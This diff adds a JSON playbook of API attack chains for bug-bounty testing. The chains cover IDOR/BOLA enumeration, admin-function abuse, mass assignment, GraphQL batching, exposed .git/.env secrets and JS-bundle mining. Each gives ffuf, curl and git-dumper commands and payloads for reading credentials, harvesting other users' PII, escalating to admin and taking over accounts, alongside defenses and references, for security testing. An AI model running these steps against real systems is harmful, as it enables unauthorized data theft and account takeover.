@@ -1,0 +1,518 @@
+{
+  "domain": "API",
+  "domainLabel": "API / GraphQL / access",
+  "domainOrder": 8,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "REST IDOR: enumerating objects up to account takeover (numeric + UUID)",
+      "level": "newbie",
+      "impact": "Read/modify any user's data and full account takeover via email change; ATO on mature programs.",
+      "why": "Object-reference bugs are the most common and lucrative finding for a beginner, leading straight to account takeover.",
+      "precondition": "An authenticated application that passes an object id in the URL or body (/api/users/1007, ?account_id=, \"userId\":), and a second test account for comparison.",
+      "tags": [
+        "idor",
+        "bola",
+        "ato",
+        "access-control"
+      ],
+      "realWorld": "PortSwigger WSA 'Insecure direct object references' labs; OWASP API1:2023 BOLA; recurring HackerOne ATO-via-email-change reports.",
+      "defense": "Verify object ownership on the server (not just authentication); alert on 200s where the requester is not the resource owner.",
+      "steps": [
+        {
+          "title": "Find all requests carrying an object id",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "proxy normal usage through Burp; flag /api/users/{id}, ?id=, \"userId\" in bodies; baseline GET /api/users/1007 (your id) = 200 + your data"
+        },
+        {
+          "title": "Decrement/increment the id manually",
+          "kind": "note",
+          "detail": "in Repeater change 1007 -> 1006/1008",
+          "success": "200 with another user's PII in the response = IDOR"
+        },
+        {
+          "title": "Automate the enumeration",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/api/users/FUZZ -H \"Cookie: session=...\" -w <(seq 1 5000) -mc 200 -fs <baseline-len>"
+        },
+        {
+          "title": "Confirm with a second account",
+          "kind": "script",
+          "q": "authz_matrix.py - authorization matrix (BOLA/no-auth)",
+          "detail": "Autorize: log in as user B, set user A token as low-priv, replay; 'Authz bypassed!' = real"
+        },
+        {
+          "title": "UUID variant: harvest and replay",
+          "kind": "note",
+          "detail": "pull other users' UUIDs from list endpoints/shared links/emails, replay GET /api/users/{leaked-uuid}"
+        },
+        {
+          "title": "Escalate read to write",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "PUT /api/users/1006 {\"email\":\"{EMAIL}\"}",
+          "success": "200 and the victim's email is changed"
+        },
+        {
+          "title": "Reset the password and take over the account",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "request reset; token lands on attacker email -> set new password -> ATO"
+        }
+      ]
+    },
+    {
+      "title": "BOLA: mass PII harvesting via /api/{id}",
+      "level": "newbie",
+      "impact": "Bulk extraction of other users' records (orders, invoices, tickets, files) = a reportable data breach depending on sensitivity and volume.",
+      "why": "An API exposes many object types beyond the profile, and it is the scale that raises the payout.",
+      "precondition": "A REST API with object endpoints like /api/orders/{id}, /api/invoices/{id}, /api/documents/{uuid} and one valid session.",
+      "tags": [
+        "bola",
+        "idor",
+        "pii",
+        "access-control"
+      ],
+      "realWorld": "OWASP API1:2023 BOLA; PortSwigger API testing methodology; common HackerOne 'access other users orders/invoices' reports.",
+      "defense": "Object-level authorization middleware keyed on the (caller, owner) pair; rate-limit and detect sequential id enumeration.",
+      "steps": [
+        {
+          "title": "Enumerate all object routes",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "from Swagger/JS/proxy history list /api/{orders,invoices,tickets,documents}/{id}"
+        },
+        {
+          "title": "Confirm BOLA with a cross-account replay",
+          "kind": "script",
+          "q": "authz_matrix.py - authorization matrix (BOLA/no-auth)",
+          "detail": "Autorize two sessions; request user B's /api/orders/9001 as user A",
+          "success": "200 on another user's object = BOLA"
+        },
+        {
+          "title": "Determine the id space",
+          "kind": "note",
+          "detail": "sequential ints -> enumerable; random UUID -> pivot to harvest-and-replay"
+        },
+        {
+          "title": "Bulk-enumerate valid records",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/api/invoices/FUZZ -w <(seq 1 20000) -H \"Authorization: Bearer ...\" -mc 200 -fr \"not found\""
+        },
+        {
+          "title": "Dump and quantify the scale",
+          "kind": "note",
+          "detail": "loop hits: curl -s -H \"Authorization: Bearer ...\" https://t/api/invoices/$ID | jq '{id,email,total}'; count unique victims"
+        },
+        {
+          "title": "Test writes (write-side BOLA)",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "PATCH /api/orders/9001 {\"shipping_address\":\"...\"} as another user; 200 = tamper others' objects"
+        },
+        {
+          "title": "Assemble impact evidence",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "redacted sample of N victims + the single decisive request/response pair"
+        }
+      ]
+    },
+    {
+      "title": "BFLA: a regular user invokes admin functions",
+      "level": "intermediate",
+      "impact": "Performing admin operations as a regular user (creating users, changing roles, deleting/reading all data), often full compromise of the admin panel.",
+      "why": "Authorization is often enforced only in the UI/menu, while the admin API still responds to a low-privilege token.",
+      "precondition": "An application with role separation and privileged endpoints (/api/admin/*, role actions) and a low-privilege account.",
+      "tags": [
+        "bfla",
+        "access-control",
+        "privesc",
+        "rbac"
+      ],
+      "realWorld": "OWASP API5:2023 BFLA; PortSwigger 'Broken function level authorization' labs; recurring admin-API-via-normal-user reports.",
+      "defense": "Centralized, deny-by-default RBAC enforced at the gateway/server for every privileged route and method.",
+      "steps": [
+        {
+          "title": "Find admin/privileged routes",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/api/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,403 -H \"Authorization: Bearer <low-priv>\""
+        },
+        {
+          "title": "Search docs/JS for privileged calls",
+          "kind": "note",
+          "detail": "grep Swagger/JS for admin, role, internal, /manage, promote"
+        },
+        {
+          "title": "Replay an admin action with a low-privilege token",
+          "kind": "payload",
+          "q": "Mass Assignment",
+          "detail": "POST /api/admin/users {\"email\":\"x\",\"role\":\"admin\"} with low-priv bearer",
+          "success": "200/201 from an admin endpoint as low-priv = BFLA"
+        },
+        {
+          "title": "Try HTTP method override",
+          "kind": "note",
+          "detail": "flip GET /api/users/9001 to DELETE/PUT, or add header X-HTTP-Method-Override: PUT"
+        },
+        {
+          "title": "Confirm with a role matrix in Autorize",
+          "kind": "script",
+          "q": "authz_matrix.py - authorization matrix (BOLA/no-auth)",
+          "detail": "admin session as enforcement baseline, low-priv as test; 'Bypassed!' on admin routes"
+        },
+        {
+          "title": "Prove privesc: elevate a user to admin",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "PUT /api/users/9001/role {\"role\":\"admin\"} as low-priv -> re-login, confirm elevation"
+        },
+        {
+          "title": "Reduce to data/account control",
+          "kind": "checklist",
+          "q": "api-testing",
+          "detail": "use the new admin function to dump users or reset a victim password"
+        }
+      ]
+    },
+    {
+      "title": "Excessive data exposure: the API returns what the UI hides",
+      "level": "newbie",
+      "impact": "Collecting sensitive fields the client never displays (password hashes, reset tokens, api_key, PII, internal flags) as a springboard for escalation.",
+      "why": "The easiest API win: you change nothing, you just read the full JSON the server oversends.",
+      "precondition": "Any JSON API behind a web or mobile client.",
+      "tags": [
+        "excessive-data-exposure",
+        "bopla",
+        "info-disclosure",
+        "api"
+      ],
+      "realWorld": "OWASP API3:2023 Broken Object Property Level Authorization (ex-Excessive Data Exposure, API3:2019); PortSwigger API testing notes.",
+      "defense": "Build the response from a server-side allow-list (serializer); never rely on the client to hide fields.",
+      "steps": [
+        {
+          "title": "Read the raw JSON, not the rendered UI",
+          "kind": "checklist",
+          "q": "api-testing",
+          "detail": "in Burp, diff fields shown on screen vs the full response body",
+          "success": "the JSON has fields that are absent from the UI"
+        },
+        {
+          "title": "Search for valuable keys",
+          "kind": "note",
+          "detail": "grep -iE '\"(password|token|hash|ssn|secret|role|is_admin|email|phone)\"' response.json"
+        },
+        {
+          "title": "Pull full self/detail objects",
+          "kind": "note",
+          "detail": "GET /api/users/me often returns more than the profile page (api_key, reset_token)"
+        },
+        {
+          "title": "Check for nested other-user data",
+          "kind": "note",
+          "detail": "list endpoints like /api/feed, /api/orders sometimes inline other users' records"
+        },
+        {
+          "title": "Compare the mobile and web APIs",
+          "kind": "note",
+          "detail": "mobile /v1/ endpoints frequently overshare; proxy the app, replay in Repeater"
+        },
+        {
+          "title": "Escalate a leaked field",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "if reset_token/api_key leaks, use it directly: reset victim password or call the API as them"
+        }
+      ]
+    },
+    {
+      "title": "Mass Assignment + HPP: privilege escalation",
+      "level": "intermediate",
+      "impact": "Setting hidden privileged attributes you should not control (role, is_admin, verified, balance, tenant_id) -> privesc or financial impact.",
+      "why": "Frameworks auto-bind JSON to the model, so extra keys silently stick when the backend forgot an allow-list.",
+      "precondition": "Write endpoints that bind the request body to an object (registration, profile update, order creation).",
+      "tags": [
+        "mass-assignment",
+        "hpp",
+        "privesc",
+        "bopla"
+      ],
+      "realWorld": "OWASP API3:2023 (BOPLA) Mass Assignment + OWASP HTTP Parameter Pollution; classic Rails/GitHub 'create_admin' cases.",
+      "defense": "Strict server-side allow-lists for bindable fields; canonicalize and reject duplicate parameters at the gateway.",
+      "steps": [
+        {
+          "title": "Capture a baseline profile/registration write",
+          "kind": "note",
+          "detail": "baseline PUT /api/users/me {\"name\":\"...\"} in Repeater"
+        },
+        {
+          "title": "Discover hidden parameters",
+          "kind": "script",
+          "q": "Parameter discovery sources (gau+katana -> unfurl -> arjun)",
+          "detail": "arjun -u https://t/api/users/me -m JSON  (or Burp Param Miner: guess JSON params)"
+        },
+        {
+          "title": "Inject privileged keys",
+          "kind": "payload",
+          "q": "Mass Assignment",
+          "detail": "add \"role\":\"admin\", \"is_admin\":true, \"email_verified\":true, \"tenant_id\":1",
+          "success": "a follow-up GET shows role=admin / elevated privileges"
+        },
+        {
+          "title": "Mirror field names from GET",
+          "kind": "note",
+          "detail": "whatever the object returns (isStaff, plan) is a mass-assignment candidate on write"
+        },
+        {
+          "title": "HPP: send duplicate parameters",
+          "kind": "payload",
+          "q": "HTTP Parameter Pollution",
+          "detail": "user_id=me&user_id=9001 or role=user&role=admin; back-end may take first/last/array"
+        },
+        {
+          "title": "HPP across parsing layers",
+          "kind": "payload",
+          "q": "HTTP Parameter Pollution",
+          "detail": "try query-vs-body duplicates and role[]=admin; proxy and back-end disagree -> authz bypass"
+        },
+        {
+          "title": "Confirm the privilege",
+          "kind": "checklist",
+          "q": "mass-assignment",
+          "detail": "re-login or call an admin-only route; elevated access = proven"
+        }
+      ]
+    },
+    {
+      "title": "GraphQL: introspection, sensitive fields, batching and aliases",
+      "level": "intermediate",
+      "impact": "Full schema disclosure -> querying sensitive fields, rate-limit bypass via batching/aliases (credential stuffing, OTP brute-forcing), exploiting field-level authz gaps.",
+      "why": "A single introspection query reveals the entire API contract, including fields and mutations the UI never calls.",
+      "precondition": "A reachable GraphQL endpoint (/graphql, /api/graphql, /v1/graphql).",
+      "tags": [
+        "graphql",
+        "introspection",
+        "batching",
+        "access-control"
+      ],
+      "realWorld": "PortSwigger 'GraphQL API vulnerabilities' labs; HackTricks GraphQL; common HackerOne GraphQL authz/batching reports.",
+      "defense": "Disable introspection in production, enforce field-level authz, limit query depth/alias count/batch size, and rate-limit per operation.",
+      "steps": [
+        {
+          "title": "Find the endpoint",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/FUZZ -w graphql-paths.txt -mc 200  for graphql, graphiql, v1/graphql, api/graphql"
+        },
+        {
+          "title": "Run an introspection query",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "POST {\"query\":\"{__schema{types{name fields{name}}}}\"}",
+          "success": "a full type list comes back = introspection is enabled"
+        },
+        {
+          "title": "Reconstruct the schema automatically",
+          "kind": "note",
+          "detail": "InQL (Burp), or clairvoyance https://t/graphql -o schema.json -w words.txt if introspection is disabled"
+        },
+        {
+          "title": "Query sensitive fields directly",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "query{users{id email phone passwordResetToken}}; data back = field-level authz gap"
+        },
+        {
+          "title": "Check per-node field-level authz (BOLA in GraphQL)",
+          "kind": "note",
+          "detail": "as a normal user, user(id:9001){email} of someone else returning data = broken object authz"
+        },
+        {
+          "title": "Bypass the rate limit with aliases and batching",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "aliases: mutation{a:login(u:\"x\",p:\"1\"){t} b:login(u:\"x\",p:\"2\"){t}}; or send JSON array [{\"query\":...},{\"query\":...}] for OTP/credential brute"
+        },
+        {
+          "title": "Probe mutations for privesc",
+          "kind": "checklist",
+          "q": "graphql",
+          "detail": "mutation{updateUser(id:9001,role:ADMIN){id}} using args you already read from the schema"
+        }
+      ]
+    },
+    {
+      "title": "Exposed /.git and .env: source code and live secrets",
+      "level": "newbie",
+      "impact": "Full source-code recovery plus hardcoded secrets (DB credentials, cloud keys, JWT signing secret) -> often direct server/data compromise.",
+      "why": "One botched deploy serves the entire codebase and working keys with no authentication at all.",
+      "precondition": "A web root that serves VCS/config artifacts (/.git/, /.env, backups, or directory listing).",
+      "tags": [
+        "git-exposure",
+        "env-leak",
+        "secrets",
+        "info-disclosure"
+      ],
+      "realWorld": "git-dumper tooling; numerous disclosed .git/.env exposure reports on HackerOne; general technique.",
+      "defense": "Block dotfiles/VCS directories at the web server, keep secrets in a vault outside the web root, and rotate immediately on leak.",
+      "steps": [
+        {
+          "title": "Probe for exposed VCS/config artifacts",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/FUZZ -w <list> -mc 200  for .git/HEAD, .env, .git/config, config.php.bak, .svn/"
+        },
+        {
+          "title": "Confirm /.git is browsable",
+          "kind": "note",
+          "detail": "curl -s https://t/.git/HEAD",
+          "success": "ref: refs/heads/main = the repository is dumpable"
+        },
+        {
+          "title": "Dump the whole repository",
+          "kind": "note",
+          "detail": "git-dumper https://t/.git/ ./loot"
+        },
+        {
+          "title": "Or pull a listed directory",
+          "kind": "note",
+          "detail": "if listing is on: wget -r -np https://t/backup/"
+        },
+        {
+          "title": "Comb the dump for secrets",
+          "kind": "script",
+          "q": "CI / repo secrets grep (AKIA / AIza / xox / ghp_ / .tfstate)",
+          "detail": "trufflehog filesystem ./loot --only-verified  and  gitleaks detect -s ./loot"
+        },
+        {
+          "title": "Read .env directly",
+          "kind": "note",
+          "detail": "curl -s https://t/.env  for DB_PASSWORD=, AWS_SECRET_ACCESS_KEY=, JWT_SECRET="
+        },
+        {
+          "title": "Escalate via the found secrets",
+          "kind": "checklist",
+          "q": "api-key-leaks",
+          "detail": "use DB creds / cloud keys / forge JWTs signed with the leaked secret"
+        }
+      ]
+    },
+    {
+      "title": "Exposed API docs (Swagger/OpenAPI/Postman): the entire attack surface",
+      "level": "newbie",
+      "impact": "A complete authoritative map of endpoints and parameters (often with undocumented admin/debug routes), instantly feeding IDOR/BFLA/mass-assignment.",
+      "why": "Why guess endpoints when the server publishes the spec itself? It is the fastest path to full surface coverage.",
+      "precondition": "Exposed API documentation or schema (/swagger, /openapi.json, /api-docs, a Postman collection, or a GraphQL playground).",
+      "tags": [
+        "swagger",
+        "openapi",
+        "api-docs",
+        "recon"
+      ],
+      "realWorld": "OWASP API testing methodology; common exposed-Swagger / public-Postman-collection reports; general technique.",
+      "defense": "Do not ship interactive docs/specs to production without authentication; put /swagger, /api-docs, and the playground behind auth.",
+      "steps": [
+        {
+          "title": "Find the docs/spec",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/FUZZ -w <list> -mc 200  for swagger-ui.html, openapi.json, api-docs, v2/api-docs, graphiql",
+          "success": "200 on swagger/openapi = the spec is accessible"
+        },
+        {
+          "title": "Download the machine-readable spec",
+          "kind": "note",
+          "detail": "curl -s https://t/openapi.json -o spec.json  (or swagger.json)"
+        },
+        {
+          "title": "Import into a client for one-click requests",
+          "kind": "note",
+          "detail": "load spec.json into Postman or Burp's OpenAPI parser to generate every request"
+        },
+        {
+          "title": "Flag the juicy operations",
+          "kind": "checklist",
+          "q": "api-testing",
+          "detail": "sort for admin, delete, internal, debug, {id} path params, and unauth-looking routes"
+        },
+        {
+          "title": "Find undocumented versions",
+          "kind": "note",
+          "detail": "try /v1 -> /v2/v3 and /internal/ siblings not linked in the UI"
+        },
+        {
+          "title": "Run the endpoints through authz tests",
+          "kind": "script",
+          "q": "authz_matrix.py - authorization matrix (BOLA/no-auth)",
+          "detail": "run the generated requests through Autorize to mass-check IDOR/BFLA"
+        },
+        {
+          "title": "Open the GraphQL playground if present",
+          "kind": "note",
+          "detail": "/graphiql or /playground gives free introspection + a query runner"
+        }
+      ]
+    },
+    {
+      "title": "Mining JS bundles: hidden endpoints and hardcoded secrets",
+      "level": "intermediate",
+      "impact": "Undocumented/admin API routes plus hardcoded secrets (API keys, Firebase configs, third-party tokens) in the front-end JS -> new surface and sometimes direct key use.",
+      "why": "SPA front-ends hand the full map of their API, and often live secrets, to every anonymous visitor right in the JS bundles.",
+      "precondition": "A JS-heavy web application (a React/Vue/Angular SPA) with downloadable bundles.",
+      "tags": [
+        "js-recon",
+        "secrets",
+        "api-key-leak",
+        "recon"
+      ],
+      "realWorld": "LinkFinder / jsluice tooling; recurring 'secrets in JS bundles' HackerOne reports; general technique.",
+      "defense": "Keep secrets server-side, scan bundles in CI (trufflehog/gitleaks), and scope/rotate any key that reaches the client.",
+      "steps": [
+        {
+          "title": "Collect all JS URLs (current + historical)",
+          "kind": "command",
+          "q": "gau / waybackurls",
+          "detail": "gau target.com | grep '\\.js' > js.txt  and  katana -u https://t -jc -d 3 | grep '\\.js'"
+        },
+        {
+          "title": "Download the bundles",
+          "kind": "note",
+          "detail": "cat js.txt | xargs -n1 curl -sO"
+        },
+        {
+          "title": "Extract endpoints/paths",
+          "kind": "script",
+          "q": "JS endpoint extractor (LinkFinder-style regex, stdlib)",
+          "detail": "linkfinder -i 'https://t/*.js' -o cli  or  jsluice urls main.js  -> collect /api/... routes"
+        },
+        {
+          "title": "Search for hardcoded secrets",
+          "kind": "script",
+          "q": "JS secret scanner (API keys / tokens / private keys)",
+          "detail": "trufflehog filesystem ./js --only-verified  and  cat js.txt | mantra",
+          "success": "trufflehog flags a verified secret (AWS/Google/Firebase/Stripe)"
+        },
+        {
+          "title": "Quick string search",
+          "kind": "note",
+          "detail": "grep -roiE '(api[_-]?key|secret|token|firebaseio\\.com|/api/[a-z/]+)' ./js"
+        },
+        {
+          "title": "Test the discovered endpoints",
+          "kind": "note",
+          "detail": "replay newly found /api/internal/* in Repeater; many lack the UI's auth gating"
+        },
+        {
+          "title": "Check for live keys",
+          "kind": "checklist",
+          "q": "api-key-leaks",
+          "detail": "check leaked keys: Firebase open DB at /.json, Google Maps key billing, Stripe live/test"
+        }
+      ]
+    }
+  ]
+}
